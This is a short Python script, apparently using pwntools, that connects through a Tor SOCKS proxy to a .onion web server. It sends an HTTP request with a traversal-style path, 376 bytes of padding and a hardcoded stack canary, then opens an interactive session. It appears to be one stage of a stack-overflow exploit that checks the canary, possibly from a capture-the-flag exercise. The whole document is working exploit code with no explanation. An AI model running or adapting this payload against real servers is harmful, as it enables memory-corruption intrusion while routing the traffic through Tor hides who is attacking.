from pwn import *
import socks

# Used to check if the canary is ok up to this point

s = socks.socksocket()
s.set_proxy(socks.SOCKS4, 'localhost', 9050)
s.connect(("xk5ubmdbh4esc3ny.onion", 80))

canary = "\x00\x26\x3d\x70\xb0\x21\x02\x7c"

p = remote.fromsocket(s)
payload = "GET /....// HTTP/1.1 "
payload += "A" * 376
p.send(payload + canary)
p.interactive()
